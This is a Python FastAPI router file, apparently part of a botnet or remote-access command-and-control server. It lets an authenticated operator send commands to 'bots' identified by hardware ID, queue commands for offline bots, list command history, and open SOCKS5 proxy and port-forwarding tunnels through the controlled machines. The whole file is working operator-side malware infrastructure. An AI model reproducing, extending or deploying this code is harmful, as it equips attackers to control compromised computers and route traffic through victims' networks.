"""Commands router."""

import json
import time
import uuid

from fastapi import APIRouter, HTTPException, Request, status

from ...protocol import write_packet
from ...storage import (
    create_tunnel_session,
    get_bot,
    list_commands_with_responses,
    mark_command_dispatched,
    save_command,
)
from ..deps import CurrentUser, EventBusDep, RegistryDep
from ..events import Event, EventType
from ..schemas import (
    Command,
    CommandListResponse,
    CommandRequest,
    CommandResponse,
    CommandStatus,
)

router = APIRouter(prefix="/api", tags=["commands"])


@router.post("/bots/{hwid}/commands", response_model=CommandResponse)
async def send_command(
    hwid: str,
    body: CommandRequest,
    request: Request,
    current_user: CurrentUser,
    registry: RegistryDep,
    event_bus: EventBusDep,
):
    """
    Send a command to a bot.

    If the bot is online, the command is sent immediately.
    If offline, it's queued and will be sent when the bot reconnects.
    """
    # Verify bot exists
    bot = await get_bot(hwid)
    if not bot:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="Bot not found",
        )

    cmd_id = str(uuid.uuid4())
    args = dict(body.args)  # mutable copy

    # Tunnel commands: create session + inject session_id into args
    command_type_value = body.command_type.value
    if command_type_value == "socks5_start":
        session_id = str(uuid.uuid4())
        args["session_id"] = session_id
        tunnel_mgr = request.app.state.tunnel_manager
        await tunnel_mgr.create_session(session_id, "socks5")
        await create_tunnel_session(session_id, hwid, "socks5")
    elif command_type_value == "portfwd_add":
        session_id = str(uuid.uuid4())
        args["session_id"] = session_id
        rhost = args.get("rhost", "")
        rport = int(args.get("rport", 0))
        lport = int(args.get("lport", 0))
        tunnel_mgr = request.app.state.tunnel_manager
        await tunnel_mgr.create_session(session_id, "portfwd",
                                         remote_host=rhost, remote_port=rport,
                                         local_port=lport)
        await create_tunnel_session(session_id, hwid, "portfwd",
                                    remote_host=rhost, remote_port=rport)

    args_json = json.dumps(args)

    # Check if bot is connected
    conn = await registry.get(hwid)
    is_online = conn is not None

    if is_online:
        # Send immediately
        packet = {
            "id": cmd_id,
            "seq": 0,
            "timestamp": int(time.time()),
            "type": "command",
            "data": {"command_type": command_type_value, "args": args},
        }

        try:
            await write_packet(conn.writer, conn.crypto, packet)
            # Save as dispatched
            await save_command(
                cmd_id, hwid, command_type_value, args_json,
                operator_id=current_user["id"], status="dispatched"
            )
            await mark_command_dispatched(cmd_id)

            # Emit event
            await event_bus.publish(Event(
                EventType.COMMAND_DISPATCHED,
                {"command_id": cmd_id, "hwid": hwid, "command_type": command_type_value}
            ))

            return CommandResponse(
                command_id=cmd_id,
                status=CommandStatus.DISPATCHED,
                queued=False,
            )
        except Exception:
            # Connection failed, queue instead
            is_online = False

    # Bot offline - queue as pending
    await save_command(
        cmd_id, hwid, command_type_value, args_json,
        operator_id=current_user["id"], status="pending"
    )

    # Emit event
    await event_bus.publish(Event(
        EventType.COMMAND_QUEUED,
        {"command_id": cmd_id, "hwid": hwid, "command_type": command_type_value}
    ))

    return CommandResponse(
        command_id=cmd_id,
        status=CommandStatus.PENDING,
        queued=True,
    )


@router.get("/bots/{hwid}/commands", response_model=CommandListResponse)
async def get_bot_commands(
    hwid: str,
    current_user: CurrentUser,
    limit: int = 100,
):
    """Get command history for a specific bot."""
    bot = await get_bot(hwid)
    if not bot:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="Bot not found",
        )

    commands = await list_commands_with_responses(bot_hwid=hwid, limit=limit)
    return CommandListResponse(
        commands=[Command(**c) for c in commands],
        total=len(commands),
    )


@router.get("/commands", response_model=CommandListResponse)
async def get_all_commands(
    current_user: CurrentUser,
    limit: int = 100,
):
    """Get command history across all bots."""
    commands = await list_commands_with_responses(limit=limit)
    return CommandListResponse(
        commands=[Command(**c) for c in commands],
        total=len(commands),
    )
